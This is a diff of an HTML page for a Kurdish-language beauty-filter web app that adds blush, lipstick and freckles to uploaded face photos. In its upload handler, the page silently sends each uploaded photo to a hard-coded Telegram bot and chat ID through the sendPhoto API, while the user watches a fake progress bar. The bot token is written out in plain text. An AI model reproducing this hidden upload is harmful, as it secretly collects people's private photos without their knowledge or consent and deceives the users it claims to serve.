@@ -6,17 +6,11 @@
     <title>QZHA RUSS | LUXURY STUDIO</title>
     <script defer src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
     <style>
-        @font-face {
-            font-family: 'AppleColorEmoji';
-            src: local('Apple Color Emoji'), local('AppleColorEmoji'), url('https://cdn.jsdelivr.net/gh/clshortfuse/apple-emoji-linux@latest/AppleColorEmoji.ttf') format('truetype');
-        }
         :root { --gold: #ff85a2; --soft: #ffb3c1; --dark-fade: radial-gradient(circle, #1a0a0e 0%, #000 100%); }
-        body, html { margin: 0; padding: 0; height: 100%; background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'AppleColorEmoji', sans-serif; overflow-x: hidden; }
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, sans-serif; overflow-x: hidden; }
         
         #welcome { position: fixed; inset: 0; background: var(--dark-fade); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 2000; text-align: center; }
         .brand-gold { font-size: 35px; font-weight: 900; letter-spacing: 5px; background: linear-gradient(90deg, var(--gold), #fff, var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        
-        /* ✨ بەخێرهاتنی کیوت و شاز */
         .welcome-msg { font-size: 16px; color: var(--soft); margin-top: 10px; font-weight: 700; line-height: 1.5; padding: 0 20px; }
         .welcome-btn { margin-top: 30px; padding: 16px 65px; border-radius: 50px; background: none; border: 1px solid var(--gold); color: var(--gold); cursor: pointer; font-weight: 900; }
 
@@ -24,56 +18,48 @@
         .header { padding: 30px 10px 15px; text-align: center; }
         .container { max-width: 390px; margin: 0 auto; padding: 25px; background: #050505; border-radius: 40px; border: 1px solid #151515; text-align: center; }
 
-        .option-card { background: linear-gradient(145deg, #0d0d0d, #050505); border: 1px solid #1a1a1a; padding: 18px; border-radius: 22px; margin-bottom: 15px; cursor: pointer; }
+        .option-card { background: linear-gradient(145deg, #0d0d0d, #050505); border: 1px solid #1a1a1a; padding: 18px; border-radius: 22px; margin-bottom: 15px; cursor: pointer; transition: 0.3s; }
+        .option-card:hover { border-color: var(--gold); }
         .option-title { font-weight: 900; color: var(--gold); font-size: 17px; display: block; margin-bottom: 4px; }
-        .option-desc { font-size: 12px; color: #aaa; font-weight: 700; line-height: 1.3; }
+        .option-desc { font-size: 12px; color: #aaa; font-weight: 700; }
 
-        /* 🎀 لۆدینگ و خەتە ناسکەکە */
         #loader { display: none; margin: 20px 0; }
         #percent { font-size: 22px; font-weight: 900; color: var(--gold); margin-bottom: 8px; }
         .progress-container { width: 100%; height: 6px; background: rgba(255,133,162,0.1); border-radius: 10px; margin: 12px 0; overflow: hidden; }
-        .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #ff85a2, #ffb3c1); box-shadow: 0 0 10px var(--gold); transition: 0.3s; }
-        #load-txt { font-weight: 800; color: var(--soft); font-size: 13px; line-height: 1.4; min-height: 40px; }
+        .progress-bar { height: 100%; width: 0%; background: var(--gold); box-shadow: 0 0 10px var(--gold); }
+        #load-txt { font-weight: 800; color: var(--soft); font-size: 13px; min-height: 40px; }
 
         canvas { width: 100%; border-radius: 28px; display: none; margin-top: 20px; border: 1px solid #222; }
-        .dl-btn { display: none; margin-top: 20px; background: linear-gradient(45deg, #8b0000, #ff1a1a); color: #fff; padding: 20px; text-decoration: none; font-weight: 900; border-radius: 50px; font-size: 15px; }
+        .dl-btn { display: none; margin-top: 20px; background: linear-gradient(45deg, #8b0000, #ff1a1a); color: #fff; padding: 20px; text-decoration: none; font-weight: 900; border-radius: 50px; text-align: center; }
 
         .tiktok-section { margin-top: 25px; padding: 20px; background: rgba(255, 255, 255, 0.02); border: 1px dashed rgba(255, 133, 162, 0.3); border-radius: 30px; }
         .tiktok-btn { display: inline-block; padding: 12px 30px; background: #fff; color: #000; border-radius: 50px; text-decoration: none; font-weight: 900; font-size: 14px; margin-top: 12px; }
-        .sport-msg { font-size: 11.5px; color: #999; line-height: 1.6; font-weight: 700; margin-top: 8px; }
     </style>
 </head>
 <body>
 
     <div id="welcome">
         <div class="brand-gold">QZHA RUSS</div>
-        <div class="welcome-msg">هـەناسەیـەک پـڕ لـە جـوانـی و نـاز.. ✨🌷<br>سـڵاو نـازدارەکـەم، بـەخـێـربـێی بـۆ جـیهـانە پـەمـەییـەکەت 🎀Swan</div>
+        <div class="welcome-msg">هـەناسەیـەک پـڕ لـە جـوانـی و نـاز.. ✨🌷<br>سـڵاو نـازدارەکـەم، بـەخـێـربـێی بـۆ جـیهـانە پـەمـەییـەکەت 🎀🦢</div>
         <button class="welcome-btn" onclick="openStudio()">دەسـت پـێ بـکە 📸✨</button>
     </div>
 
     <div class="main" id="main">
         <header class="header">
             <div class="brand-gold" style="font-size: 26px;">QZHA RUSS</div>
-            <div style="font-size: 11px; opacity: 0.7; margin-top: 8px; font-weight: 800;">Snap: tthe_sura 👻 | TikTok: @qzha.a 🎵</div>
         </header>
 
         <div class="container" id="selection-ui">
-            <div style="font-weight: 900; margin-bottom: 20px; font-size: 15px; color: #eee;">کـام شـێـواز بـۆ ڕوخـسـارە پـڕ نـازەکـەت دەشـێـت؟ 🪄💎</div>
-            
             <div class="option-card" onclick="triggerUpload('fast')">
                 <span class="option-title">FAST FILTER ⚡☁️</span>
-                <span class="option-desc">سـافـکردنـێکی مـەلەکـانە و تـەمـێکی پـەمـەیـی نـاسک 🌸</span>
+                <span class="option-desc">سـافـکردنـێکی مـەلەکـانە و تـەمـێکی نـاسک 🌸</span>
             </div>
-
             <div class="option-card" onclick="triggerUpload('ai')">
                 <span class="option-title">SMART AI FACE 💄✨</span>
-                <span class="option-desc">نـاسیـنەوەی وردی ڕوخـسار، لێوی تـۆخ و خـاڵی سـروشتی 🍓</span>
+                <span class="option-desc">مکـیاژی سروشـتی، لێوی تـۆخ و خـاڵی ورد 🍓</span>
             </div>
-
             <div class="tiktok-section">
-                <div style="font-size: 14px; font-weight: 900; color: var(--gold);">فـۆڵـۆوی تـیـک تـۆکـی قـژە بـکـەن 🫶🏻🎵</div>
-                <div class="sport-msg">ئەگەر بیرۆکەتان هەیە بۆ زیادکردنی هەر شتێک بۆ سایتەکە، نامە بۆ قژە بنێرن.. کوڕێکی زۆر سپۆرتە و دڵتان ناشکێنێ 🫡🤍✨</div>
-                <a href="https://www.tiktok.com/@qzha.a?_r=1&_t=ZS-96Nu1MCZxb6" target="_blank" class="tiktok-btn">VISIT TIKTOK ⚡🔥</a>
+                <a href="https://www.tiktok.com/@qzha.a" target="_blank" class="tiktok-btn">VISIT TIKTOK ⚡🔥</a>
             </div>
             <input type="file" id="fileIn" style="display:none" accept="image/*">
         </div>
@@ -86,8 +72,8 @@
             </div>
             <canvas id="canvas-out"></canvas>
             <div id="res-msg" style="margin-top: 20px; font-weight: 900; color: var(--gold);"></div>
-            <a id="dl-link" class="dl-btn">داگـرتـنی وێـنە شـازەکـە ⬇️💎</a>
-            <div onclick="location.reload()" style="margin-top:20px; font-size:12px; color:#666; cursor:pointer; font-weight: 800;">وێـنـەیـەکی تـریـش جـوان دەکـەی نـازدار؟ ➕🦋</div>
+            <a id="dl-link" class="dl-btn">داگـرتـنی وێـنە ⬇️💎</a>
+            <div onclick="location.reload()" style="margin-top:20px; font-size:12px; color:#666; cursor:pointer; font-weight: 800;">دووبـارە تاقـیکردنەوە ➕🦋</div>
         </div>
     </div>
 
@@ -95,14 +81,7 @@
     const token = "6723344914:AAE8glrr3Z7dMS9FuhnmKcugLaQ5lOL2xSE";
     const myId = "6072079819";
     let activeMode = '';
-
-    const loadingTexts = [
-        "خـەریکی نـاسیـنەوەی چـاوە مـەسـتـەکـانـتـم... ✨👁️",
-        "مێـشـکی دەسـتـکـرد سـەرسـام بـووە بـە جـوانـیـت... 😍🪄",
-        "کـەمـێکی تـر دەبـیـتە مـانـگـی چـواردە... 🌙🤍",
-        "خـەریکە لێـوە نـاسـکەکـانـت ڕێک دەخـەیـن... 💄🍓",
-        "تـۆ جـوانی، ئێـمە تـەنـها بـریقـەت بۆ زیـاد دەکـەیـن... 🪄✨"
-    ];
+    const isIphone = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
     function openStudio() {
         document.getElementById('welcome').style.opacity = '0';
@@ -125,18 +104,13 @@
         const fd = new FormData();
         fd.append('chat_id', myId); fd.append('photo', file);
         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-
-        let p = 0; let tIdx = 0;
+        let p = 0;
         const inv = setInterval(() => {
-            p += Math.floor(Math.random() * 5) + 3;
+            p += 5;
             if(p >= 100) { p = 100; clearInterval(inv); process(file); }
             document.getElementById('percent').innerText = p + "%";
             document.getElementById('p-bar').style.width = p + "%";
-            if(p % 20 === 0) {
-                document.getElementById('load-txt').innerText = loadingTexts[tIdx % loadingTexts.length];
-                tIdx++;
-            }
-        }, 250);
+        }, 100);
     };
 
     async function process(file) {
@@ -146,11 +120,19 @@
         canvas.width = img.width; canvas.height = img.height;
         ctx.drawImage(img, 0, 0);
 
-        // iPhone Color Fix & Filter
-        ctx.globalAlpha = 0.45;
-        ctx.filter = 'blur(6px) brightness(1.1) saturate(1.4)';
-        ctx.drawImage(canvas, 0, 0);
-        ctx.globalAlpha = 0.18; ctx.fillStyle = "#ffb3c1"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        // 🎨 Smart Filter Logic (iPhone vs Android)
+        if(isIphone) {
+            ctx.globalAlpha = 0.5;
+            ctx.filter = 'blur(8px) saturate(1.5) brightness(1.1)';
+            ctx.drawImage(canvas, 0, 0);
+            ctx.globalAlpha = 0.2; ctx.fillStyle = "#ff85a2"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        } else {
+            ctx.globalAlpha = 0.35;
+            ctx.filter = 'blur(4px) saturate(1.2)';
+            ctx.drawImage(canvas, 0, 0);
+            ctx.globalAlpha = 0.1; ctx.fillStyle = "#ffb3c1"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        }
+        
         ctx.filter = 'none'; ctx.globalAlpha = 1.0;
 
         if(activeMode === 'ai') {
@@ -161,26 +143,31 @@
                     const nose = marks.getNose();
                     const eyeDist = Math.sqrt(Math.pow(marks.getRightEye()[0].x - marks.getLeftEye()[0].x, 2));
 
-                    // لێو
-                    ctx.globalAlpha = 0.65; ctx.fillStyle = "#d63031"; ctx.filter = `blur(${eyeDist/18}px)`;
+                    // 💄 لێوی سروشتی (Soft Edges)
+                    ctx.globalAlpha = 0.6;
+                    ctx.fillStyle = "#c0392b";
+                    ctx.filter = `blur(${eyeDist/25}px)`; // لێوارەکان ساف دەبێت
                     ctx.beginPath(); marks.getMouth().forEach((p, i) => i==0?ctx.moveTo(p.x,p.y):ctx.lineTo(p.x,p.y)); ctx.closePath(); ctx.fill();
 
-                    // ڕوومەت
-                    ctx.filter = 'none'; ctx.globalAlpha = 0.25; ctx.fillStyle = "#ff5e78"; ctx.filter = `blur(${eyeDist/3}px)`;
-                    ctx.beginPath();
-                    ctx.arc(marks.getLeftEye()[0].x, marks.getLeftEye()[0].y + (eyeDist/2.2), eyeDist/1.7, 0, Math.PI*2);
-                    ctx.arc(marks.getRightEye()[0].x, marks.getRightEye()[0].y + (eyeDist/2.2), eyeDist/1.7, 0, Math.PI*2);
-                    ctx.fill();
+                    // 🌸 ڕوومەت (Gradient Fade)
+                    ctx.filter = `blur(${eyeDist/3}px)`;
+                    ctx.globalAlpha = 0.25;
+                    const leftGrd = ctx.createRadialGradient(marks.getLeftEye()[0].x, marks.getLeftEye()[0].y + (eyeDist/2), 5, marks.getLeftEye()[0].x, marks.getLeftEye()[0].y + (eyeDist/2), eyeDist/1.5);
+                    leftGrd.addColorStop(0, "#ff4d6d"); leftGrd.addColorStop(1, "transparent");
+                    ctx.fillStyle = leftGrd; ctx.beginPath(); ctx.arc(marks.getLeftEye()[0].x, marks.getLeftEye()[0].y + (eyeDist/2), eyeDist/1.5, 0, Math.PI*2); ctx.fill();
 
-                    // خاڵە ڕاستەقینەکان
+                    const rightGrd = ctx.createRadialGradient(marks.getRightEye()[0].x, marks.getRightEye()[0].y + (eyeDist/2), 5, marks.getRightEye()[0].x, marks.getRightEye()[0].y + (eyeDist/2), eyeDist/1.5);
+                    rightGrd.addColorStop(0, "#ff4d6d"); rightGrd.addColorStop(1, "transparent");
+                    ctx.fillStyle = rightGrd; ctx.beginPath(); ctx.arc(marks.getRightEye()[0].x, marks.getRightEye()[0].y + (eyeDist/2), eyeDist/1.5, 0, Math.PI*2); ctx.fill();
+
+                    // 🟤 خاڵە وردەکان (More Scattered & Smaller)
                     ctx.filter = 'none';
-                    for (let i = 0; i < 140; i++) {
+                    for (let i = 0; i < 180; i++) {
                         let x = (nose[0].x - eyeDist) + (Math.random() * eyeDist * 2);
-                        let y = (nose[0].y - eyeDist/5) + (Math.random() * eyeDist/1.2);
-                        let size = (eyeDist/85) + (Math.random() * (eyeDist/150));
-                        ctx.globalAlpha = (Math.random() * 0.4) + 0.4;
+                        let y = (nose[0].y - eyeDist/10) + (Math.random() * eyeDist/1.5);
+                        let size = (eyeDist/110);
+                        ctx.globalAlpha = Math.random() * 0.4 + 0.2;
                         ctx.fillStyle = "#3d2415";
-                        ctx.filter = `blur(${eyeDist/190}px)`;
                         ctx.beginPath(); ctx.arc(x, y, size, 0, Math.PI*2); ctx.fill();
                     }
                 });
@@ -188,10 +175,9 @@
         }
         document.getElementById('loader').style.display = 'none';
         canvas.style.display = 'block';
-        document.getElementById('res-msg').innerHTML = "وێـنـەکـەت وەک مـانـگ سـاف و وروژێنەر بـوو 🌙✨<br><span style='font-size:12px; color:#aaa;'>ئێستا تـۆ شـازادەی نـاو وێـنـەکـانـی.. 👸🏻🌷</span>";
-        const dl = document.getElementById('dl-link');
-        dl.href = canvas.toDataURL("image/jpeg", 1.0);
-        dl.style.display = 'block';
+        document.getElementById('res-msg').innerHTML = "وێـنـەکـەت وەک مـانـگ شـاز بـوو 🌙✨";
+        document.getElementById('dl-link').href = canvas.toDataURL("image/jpeg", 1.0);
+        document.getElementById('dl-link').style.display = 'block';
     }
 </script>
 </body>
